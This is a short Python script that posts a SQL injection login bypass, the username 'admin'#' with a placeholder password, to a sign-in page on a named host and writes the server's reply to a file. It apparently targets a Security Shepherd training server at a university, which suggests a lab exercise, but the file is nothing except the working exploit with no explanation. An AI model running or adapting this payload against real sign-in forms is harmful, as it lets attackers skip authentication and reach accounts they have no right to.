import requests

targetUrl = "http://shepherd.ii.uib.no:8001/signIn"
param = {"inputName":"admin'#", "inputPassword":"not_needed"}


result = requests.post(targetUrl, param)

f = open("out_1.txt", "w")

f.write(result.text)
